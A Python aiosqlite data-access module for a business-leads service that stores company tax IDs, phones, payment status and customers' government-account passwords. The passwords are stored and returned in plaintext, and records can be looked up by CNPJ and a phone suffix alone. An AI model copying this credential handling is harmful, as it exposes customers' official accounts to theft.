import aiosqlite
import os
import json
from datetime import datetime

DB_PATH = "database.db"

async def init_db():
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            CREATE TABLE IF NOT EXISTS leads (
                id TEXT PRIMARY KEY,
                payment_id TEXT,
                cnpj TEXT,
                razao_social TEXT,
                plan TEXT,
                price REAL,
                status TEXT,
                phone TEXT,
                gov_password TEXT,
                progress INTEGER DEFAULT 0,
                message TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        # Adicionar coluna se não existir (migração simples)
        try:
            await db.execute("ALTER TABLE leads ADD COLUMN razao_social TEXT")
            await db.commit()
        except:
            pass
        await db.commit()

async def save_order(order_data: dict):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            INSERT INTO leads (id, payment_id, cnpj, razao_social, plan, price, status, progress, message)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            order_data["id"],
            order_data["payment_id"],
            order_data["cnpj"],
            order_data.get("razao_social", ""),
            order_data["plan"],
            order_data["price"],
            order_data["status"],
            order_data.get("progress", 0),
            order_data.get("message", "")
        ))
        await db.commit()

async def get_order(order_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM leads WHERE id = ?", (order_id,)) as cursor:
            row = await cursor.fetchone()
            return dict(row) if row else None

async def update_order_status(order_id: str, status: str, progress: int, message: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            UPDATE leads 
            SET status = ?, progress = ?, message = ?
            WHERE id = ?
        """, (status, progress, message, order_id))
        await db.commit()

async def update_payment_paid(order_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            UPDATE leads 
            SET status = 'paid', message = 'Pagamento aprovado!'
            WHERE id = ?
        """, (order_id,))
        await db.commit()

async def update_contact_phone(order_id: str, phone: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            UPDATE leads SET phone = ? WHERE id = ?
        """, (phone, order_id))
        await db.commit()

async def update_gov_password(order_id: str, password: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("""
            UPDATE leads SET gov_password = ? WHERE id = ?
        """, (password, order_id))
        await db.commit()

async def get_all_leads():
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        async with db.execute("SELECT * FROM leads ORDER BY created_at DESC") as cursor:
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
async def delete_lead(order_id: str):
    async with aiosqlite.connect(DB_PATH) as db:
        await db.execute("DELETE FROM leads WHERE id = ?", (order_id,))
        await db.commit()

async def get_lead_for_tracking(cnpj: str, phone_suffix: str):
    async with aiosqlite.connect(DB_PATH) as db:
        db.row_factory = aiosqlite.Row
        # Search by CNPJ and check if the phone ends with the suffix
        query = "SELECT * FROM leads WHERE cnpj = ? AND status IN ('paid', 'completed')"
        async with db.execute(query, (cnpj,)) as cursor:
            rows = await cursor.fetchall()
            for row in rows:
                if row['phone'] and row['phone'].replace('-', '').replace(' ', '').replace('(', '').replace(')', '').endswith(phone_suffix):
                    return dict(row)
            return None

async def update_lead_contact(order_id: str, phone: str, name: str = None):
    async with aiosqlite.connect(DB_PATH) as db:
        if name:
            await db.execute("UPDATE leads SET phone = ?, razao_social = ? WHERE id = ?", (phone, name, order_id))
        else:
            await db.execute("UPDATE leads SET phone = ? WHERE id = ?", (phone, order_id))
        await db.commit()
